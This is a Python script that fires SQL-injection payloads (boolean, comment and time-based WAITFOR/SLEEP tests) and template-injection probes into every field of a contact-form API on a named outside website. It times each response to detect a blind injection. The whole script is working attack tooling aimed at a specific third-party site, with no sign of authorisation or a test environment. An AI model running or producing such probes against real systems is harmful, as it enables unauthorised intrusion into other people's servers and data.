import requests, time, json
U="https://www.infinitycapital.bh/api/send"
BASE=dict(fname="ICTest",lname="Tester",areacode="973",tel="5550001",
          cname="IC Test",subject="baseline",msg="hello",check="active",
          targets="probe@oob.invalid")
def go(mut=None, **kw):
    d=dict(BASE); d.update(kw)
    if mut: d[mut[0]]=mut[1]
    try:
        r=requests.post(U,data=d,timeout=25)
        return r.status_code, r.text[:200], len(r.content)
    except Exception as e:
        return "ERR", str(e)[:120], 0
print("BASELINE:", go())
tests=[
 ("fname","a' OR '1'='1"), ("fname","a' OR '1'='2"),
 ("fname","a'--"), ("fname","a';WAITFOR DELAY '0:0:3'--"),
 ("fname","{{7*7}}"), ("fname","${7*7}"), ("fname","<%=7*7%>"),
 ("cname","a' AND SLEEP(3)--"), ("subject","a' AND SLEEP(3)--"),
 ("msg","a' AND SLEEP(3)--"), ("tel","1' AND SLEEP(3)--"),
 ("targets","a' AND SLEEP(3)--@oob.invalid"), ("areacode","1' AND SLEEP(3)--"),
 ("check","1' AND SLEEP(3)--"), ("lname","1' AND SLEEP(3)--"),
]
for f,v in tests:
    t0=time.time(); c,b,l=go((f,v)); dt=time.time()-t0
    print(f"{f:10s} {v[:28]:30s} -> {c} {dt:5.2f}s {b[:120]}")
